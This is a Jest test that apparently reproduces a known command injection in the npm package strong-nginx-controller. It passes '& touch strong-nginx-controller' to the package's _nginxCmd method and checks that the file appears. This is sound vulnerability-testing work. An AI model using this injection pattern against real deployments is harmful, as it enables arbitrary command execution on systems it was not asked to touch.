//https://snyk.io/vuln/SNYK-JS-STRONGNGINXCONTROLLER-564248
test("Command Injection in strong-nginx-controller", () => 
{
	const Root = require("strong-nginx-controller");
	const fs = require('fs');
	const path = './strong-nginx-controller';
	const sleep = require('sleep');
	
	let baseDir = "";
	let nginxPath = "./";
	let controlEndpoint = {
	hostname: "abd",
	port: 123
	}
	let listenEndpoint =12;
	let nginxRoot = "";
	let root = new Root(baseDir, nginxPath, controlEndpoint, listenEndpoint,nginxRoot);
	let action = "& touch strong-nginx-controller";

	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	try{
		root._nginxCmd(action,function(){});
	}
	catch(error)
	{
		console.log("error");
	}
	
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
